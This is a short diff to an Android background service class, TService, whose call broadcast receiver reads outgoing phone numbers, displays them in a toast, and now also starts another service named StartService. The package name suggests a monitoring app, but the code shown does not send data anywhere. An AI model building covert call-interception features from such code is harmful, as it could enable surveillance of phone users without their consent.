@@ -13,6 +13,8 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
 
+import com.postal.omniscient.postal.service.StartService;
+
 import java.io.File;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
@@ -83,7 +85,7 @@ public class TService extends Service {
         // if(terminate != null) {
         // stopSelf();
         // }
-        return START_REDELIVER_INTENT;
+        return START_NOT_STICKY;//_REDELIVER_INTENT;
     }
 
     public class CallBr extends BroadcastReceiver {
@@ -150,8 +152,13 @@ public class TService extends Service {
                 if ((bundle = intent.getExtras()) != null) {
                     outCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                     Toast.makeText(context, "OUT : " + outCall, Toast.LENGTH_LONG).show();
+
+
                 }
             }
+            // ALGA
+            Intent par = new Intent(getApplicationContext(), StartService.class);
+            startService(par);
         }
     }
 
